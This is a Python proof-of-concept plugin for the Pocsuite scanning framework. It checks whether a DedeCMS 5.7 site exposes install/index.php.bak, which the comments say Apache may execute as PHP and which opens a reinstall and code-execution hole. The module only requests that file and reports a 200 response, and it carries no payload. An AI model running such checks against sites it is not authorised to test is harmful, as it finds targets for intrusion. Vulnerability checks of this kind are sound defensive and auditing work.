#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID='5'
    version = '1'
    author = ['fengxuan']
    vulDate = '2016-5-27'
    createDate = '2016-2-20'
    updateDate = '2016-2-20'
    references = ['http://www.evalshell.com', 'http://www.cnseay.com/3714/']
    name = 'dedecms install/index.php.bak重装漏洞'
    appPowerLink = 'http://www.dedecms.cn/'
    appName = 'dedecms'
    appVersion = '5.7'
    vulType = 'Code Execution'
    desc = '''
            dedecms
            在默认安装后回生成install/index.php.bak。来判断网站是否安装。
            但是在web容器为apache的情况下，对index.php.bak会解析为php文件
            详情请搜索apache解析漏洞
    '''
    samples = ['']

    def _attack(self):
        return self._verify()

    def _verify(self, verify=True):
        result = {}
        vul_url = '%s/install/index.php.bak' % self.url

        response = req.get(vul_url)
        if response.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)
